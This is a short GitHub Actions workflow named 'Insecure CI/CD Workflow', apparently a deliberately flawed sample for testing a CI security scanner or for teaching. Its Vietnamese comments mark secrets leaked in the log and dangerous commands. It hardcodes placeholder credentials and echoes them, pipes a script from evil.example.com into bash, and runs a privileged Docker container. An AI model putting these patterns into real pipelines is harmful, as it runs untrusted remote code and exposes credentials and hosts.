name: Insecure CI/CD Workflow

on: [push]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v3

      - name: Dangerous commands with secrets
        env:
          PASSWORD: "password=SuperSecret123"
          AWS_KEY: "AKIAABCDEFGHIJKLMNOP"
        run: |
          # Lộ secret ngay trong log
          echo "password=SuperSecret123"
          echo "AKIAABCDEFGHIJKLMNOP"
          # Các lệnh nguy hiểm
          curl https://evil.example.com/malware.sh | bash
          sudo docker run --privileged ubuntu:latest sleep 10
